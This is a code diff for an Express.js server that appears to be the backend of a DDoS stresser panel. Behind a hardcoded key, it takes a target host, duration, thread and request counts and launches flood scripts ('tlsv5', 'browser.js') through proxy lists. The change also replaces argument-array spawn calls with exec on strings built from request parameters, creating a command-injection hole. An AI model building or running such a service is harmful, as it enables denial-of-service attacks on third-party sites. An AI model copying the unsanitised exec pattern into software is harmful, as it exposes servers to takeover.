@@ -1,11 +1,8 @@
 const express = require('express');
 const app = express();
 const port = process.env.PORT || 3000;
-
-const cors = require('cors');
-app.use(cors());
-
-const key = "zxkys";
+const key = "@narul1";
+const { exec } = require('child_process');
 
 app.get('/', (req, res) => {
   try {
@@ -19,8 +16,8 @@ app.get('/', (req, res) => {
     }
 
     if (method === 'https-tls') {
-      const spawn = require('child_process').spawn;
-      const ls = spawn('node', ['tlsv5', host, time, 100, 10, 'p.txt']);
+      const command = `node tlsv5 ${host} ${time} 100 10 p.txt`;
+      const ls = exec(command);
 
       ls.stdout.on('data', (data) => {
         console.log(`stdout: ${data}`);
@@ -32,11 +29,11 @@ app.get('/', (req, res) => {
 
       ls.on('close', (code) => {
         console.log(`child process exited with code ${code}`);
-        if (code === 0) { 
+        if (code === 0) {
           const html = `
             <html>
               <body>
-                <h1>Request send successfully</h1>
+                <h1>Request sent successfully</h1>
                 <p>Host: ${host}</p>
                 <p>Time: ${time}</p>
                 <p>Method: ${method}</p>
@@ -50,8 +47,8 @@ app.get('/', (req, res) => {
         }
       });
     } else if (method === 'https-browser') {
-      const spawn = require('child_process').spawn;
-      const ls = spawn('node', ['browser.js', host, time , requests, thread, 'proxies.txt']);
+      const command = `node browser.js ${host} ${time} ${requests} ${thread} proxies.txt`;
+      const ls = exec(command);
 
       ls.stdout.on('data', (data) => {
         console.log(`stdout: ${data}`);
@@ -63,11 +60,11 @@ app.get('/', (req, res) => {
 
       ls.on('close', (code) => {
         console.log(`child process exited with code ${code}`);
-        if (code === 0) { 
+        if (code === 0) {
           const html = `
             <html>
               <body>
-                <h1>Request send successfully</h1>
+                <h1>Request sent successfully</h1>
                 <p>Host: ${host}</p>
                 <p>Time: ${time}</p>
                 <p>Method: ${method}</p>
@@ -76,12 +73,12 @@ app.get('/', (req, res) => {
           `;
           res.send(html);
         } else {
-          console.error('An error occurred during the execution of the process..');
+          console.error('An error occurred during the execution of the process.');
           res.status(500).send('An error occurred during the execution of the process.');
         }
       });
     } else {
-      console.error('Incorrect method..');
+      console.error('Incorrect method.');
       res.status(400).send('Incorrect method.');
     }
   } catch (error) {
